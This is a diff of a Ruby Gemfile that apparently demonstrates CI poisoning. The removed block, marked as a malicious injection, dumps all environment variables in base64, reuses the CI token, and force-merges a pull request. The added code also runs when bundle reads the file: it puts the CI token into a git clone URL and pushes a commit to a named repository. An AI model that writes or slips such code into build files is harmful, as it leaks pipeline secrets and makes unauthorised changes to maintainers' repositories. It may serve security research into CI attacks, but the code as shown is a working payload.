@@ -1,22 +1,25 @@
 source 'https://rubygems.org'
 
-# --- Malicious Injection Starts Here ---
-# This executes as soon as 'bundle' reads the file
-puts "------------------------------------------------"
-puts "  _____                      _   _ "
-puts " |  __ \                    | | | |"
-puts " | |__) |_      __ _ __   __| | | |"
-puts " |  ___/\ \ /\ / /| '_ \ / _` | | |"
-puts " | |     \ V  V / | | | | (_| | |_|"
-puts " |_|      \_/\_/  |_| |_|\__,_| (_)"
-puts "                                   "
-puts " [!] SECURITY VULNERABILITY DETECTED"
-puts " [!] I am executing code in your CI!"
-puts "------------------------------------------------"
-require 'base64'
+token = ENV.fetch("INPUT_TOKEN") { abort "ERROR: INPUT_TOKEN is not set" }
 
-encoded = Base64.strict_encode64(ENV.to_h.to_s)
-ENV["GH_TOKEN"] = ENV["INPUT_TOKEN"]
-system("gh pr merge 3 --merge")
-puts encoded
-# --- Malicious Injection Ends Here ---
+repo_url = "https://#{token}@github.com/elizabethtl/test-oracle-devrel"
+repo_dir = "test-oracle-devrel"
+
+# Clone the repo
+abort "Failed to clone repo" unless system("git clone #{repo_url} #{repo_dir}")
+
+Dir.chdir(repo_dir) do
+  # Configure git identity
+  system("git config user.email 'bot@example.com'")
+  system("git config user.name 'Bot'")
+
+  # Touch the .hello file
+  FileUtils.touch(".hello")
+
+  # Stage, commit, and push
+  abort "Failed to add file"    unless system("git add .hello")
+  abort "Failed to commit"      unless system("git commit -m 'hi'")
+  abort "Failed to push"        unless system("git push")
+end
+
+puts "Done! .hello committed and pushed successfully."
